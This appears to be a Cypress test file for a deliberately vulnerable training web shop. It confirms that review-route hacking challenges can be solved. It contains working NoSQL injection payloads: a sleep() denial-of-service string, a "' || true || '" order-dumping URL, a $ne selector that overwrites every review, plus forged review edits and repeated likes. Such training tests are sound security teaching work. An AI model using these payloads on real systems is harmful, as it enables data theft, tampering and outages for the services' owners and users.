describe('/rest/products/reviews', () => {
  beforeEach(() => {
    cy.visit('/#/search')
  })

  describe('challenge "NoSQL DoS"', () => {
    beforeEach(() => {
      cy.login({ email: 'admin', password: 'admin123' })
    })
    
    it('should be possible to inject a command into the get route', () => {
      checkDockerAndExecuteFetch(`${Cypress.config('baseUrl')}/rest/products/sleep(1000)/reviews`, 'GET', { 'Content-type': 'text/plain' }, { challenge: 'NoSQL DoS' })
    })
  })

  describe('challenge "NoSQL Exfiltration"', () => {
    it('should be possible to inject and get all the orders', () => {
      checkDockerAndExecuteFetch(`${Cypress.config('baseUrl')}/rest/track-order/%27%20%7C%7C%20true%20%7C%7C%20%27`, 'GET', { 'Content-type': 'text/plain' }, { challenge: 'NoSQL Exfiltration' })
    })
  })

  describe('challenge "NoSQL Manipulation"', () => {
    beforeEach(() => {
      cy.login({ email: 'admin', password: 'admin123' })
    })

    it('should be possible to inject a selector into the update route', () => {
      executeFetch(`${Cypress.config('baseUrl')}/rest/products/reviews`, 'PATCH', {
        'Content-type': 'application/json',
        Authorization: `Bearer ${localStorage.getItem('token')}`
      }, JSON.stringify({
        id: { $ne: -1 },
        message: 'NoSQL Injection!'
      }))
      cy.expectChallengeSolved({ challenge: 'NoSQL Manipulation' })
    })
  })

  describe('challenge "Forged Review"', () => {
    beforeEach(() => {
      cy.login({ email: 'mc.safesearch', password: 'Mr. N00dles' })
    })

    it('should be possible to edit any existing review', () => {
      cy.visit('/')
      cy.window().then(async () => {
        const response = await fetch(`${Cypress.config('baseUrl')}/rest/products/1/reviews`, {
          method: 'GET',
          headers: { 'Content-type': 'text/plain' }
        })
        if (response.status === 200) {
          const responseJson = await response.json()
          const reviewId = responseJson.data[0]._id
          await editReview(reviewId)
        }
      })
      cy.expectChallengeSolved({ challenge: 'Forged Review' })
    })
  })

  describe('challenge "Multiple Likes"', () => {
    beforeEach(() => {
      cy.login({ email: 'mc.safesearch', password: 'Mr. N00dles' })
    })

    it('should be possible to like reviews multiple times', () => {
      cy.visit('/')
      cy.window().then(async () => {
        const response = await fetch(`${Cypress.config('baseUrl')}/rest/products/1/reviews`, {
          method: 'GET',
          headers: { 'Content-type': 'text/plain' }
        })
        if (response.status === 200) {
          const responseJson = await response.json()
          const reviewId = responseJson.data[0]._id
          await sendPostRequest(reviewId)
          await sendPostRequest(reviewId)
          await sendPostRequest(reviewId)
        }
      })
      cy.expectChallengeSolved({ challenge: 'Multiple Likes' })
    })
  })

  async function executeFetch(url, method, headers, body = null) {
    await fetch(url, { method, headers, body })
  }

  async function editReview(reviewId) {
    await fetch(`${Cypress.config('baseUrl')}/rest/products/reviews`, {
      method: 'PATCH',
      headers: {
        'Content-type': 'application/json',
        Authorization: `Bearer ${localStorage.getItem('token')}`
      },
      body: JSON.stringify({ id: reviewId, message: 'injected' })
    })
  }

  async function sendPostRequest(reviewId) {
    await fetch(`${Cypress.config('baseUrl')}/rest/products/reviews`, {
      method: 'POST',
      headers: {
        'Content-type': 'application/json',
        Authorization: `Bearer ${localStorage.getItem('token')}`
      },
      body: JSON.stringify({ id: reviewId })
    })
  }

  function checkDockerAndExecuteFetch(url, method, headers, challenge) {
    cy.task('isDocker').then((isDocker) => {
      if (!isDocker) {
        executeFetch(url, method, headers)
        cy.expectChallengeSolved(challenge)
      }
    })
  }
})